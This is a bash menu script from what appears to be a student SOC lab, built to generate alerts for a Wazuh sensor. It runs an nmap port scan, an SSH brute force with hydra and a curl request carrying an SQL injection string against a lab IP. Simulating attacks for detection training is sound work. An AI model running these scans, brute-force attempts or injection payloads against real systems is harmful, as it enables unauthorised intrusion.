#!/bin/bash

# SOC LAB - TEAM 16
# Member 3 - Target Admin & Red Team Lead
# Authorized lab testing only

TARGET="10.0.0.10"
SENSOR="192.168.100.20"
SSH_USER="ubuntu"
PASS_FILE="$HOME/test_pass.txt"
EVIDENCE="$HOME/soc-lab/evidence"

mkdir -p "$EVIDENCE"

echo "========================================"
echo "       SOC LAB - TEAM 16"
echo "       ATTACK SIMULATION - TV3"
echo "========================================"
echo "Target : $TARGET"
echo "Sensor : $SENSOR"
echo ""
echo "1. TC-01 - Nmap Port Scan"
echo "2. TC-02 - SSH Brute Force"
echo "3. TC-03 - SQL Injection Simulation"
echo "4. TC-04 - FIM Simulation Guide"
echo "0. Exit"
echo "========================================"

read -rp "Select test case: " choice

if [[ "$choice" == "0" ]]; then
    exit 0
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)

case "$choice" in

    1)
        echo "[TC-01] Nmap Port Scan"
        echo "Target: $TARGET"
        sudo nmap -sS -Pn -p 22,80 "$TARGET" \
          2>&1 | tee "$EVIDENCE/TC01_$TIMESTAMP.log"
        ;;

    2)
        echo "[TC-02] SSH Brute Force"
        if [[ ! -f "$PASS_FILE" ]]; then
            echo "Password test file not found!"
            exit 1
        fi
        hydra -l "$SSH_USER" -P "$PASS_FILE" \
          -t 1 -f -V "ssh://$TARGET" \
          2>&1 | tee "$EVIDENCE/TC02_$TIMESTAMP.log"
        ;;

    3)
        echo "[TC-03] SQL Injection Simulation"
        curl -v --max-time 10 --get \
          --data-urlencode "id=1' OR '1'='1" \
          "http://$TARGET/" \
          2>&1 | tee "$EVIDENCE/TC03_$TIMESTAMP.log"
        ;;

    4)
        echo "[TC-04] FIM Simulation"
        echo "Perform this test on Target-Server."
        echo "Create a harmless test file in /var/www/html."
        echo "Check the FIM alert on Wazuh Dashboard."
        echo "This test requires a connected Wazuh Agent."
        ;;

    *)
        echo "Invalid option!"
        exit 1
        ;;

esac

echo ""
echo "========================================"
echo "Test command finished."
echo "Evidence directory: $EVIDENCE"
echo "========================================"
